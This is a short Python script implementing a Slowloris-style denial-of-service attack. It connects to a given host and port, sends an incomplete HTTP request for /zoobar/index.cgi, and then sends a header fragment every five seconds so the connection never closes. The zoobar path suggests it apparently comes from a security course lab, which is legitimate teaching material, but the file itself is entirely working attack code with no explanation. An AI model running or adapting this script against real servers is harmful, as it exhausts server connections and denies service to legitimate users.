#!/usr/bin/env python3
import socket
import sys
import time


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} host port")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print(f"[+] Connected to {host}:{port}")
    print("[+] Sending a partial HTTP request and keeping the connection open")

    sock.sendall(b"GET /zoobar/index.cgi HTTP/1.0\r\n")
    sock.sendall(b"Host: localhost\r\n")

    counter = 0
    try:
        while True:
            sock.sendall(b"X-Keep-Open: a\r")
            counter += 1
            print(f"[+] Partial header chunk {counter} sent")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[+] Stopped by user")
    finally:
        sock.close()


if __name__ == "__main__":
    main()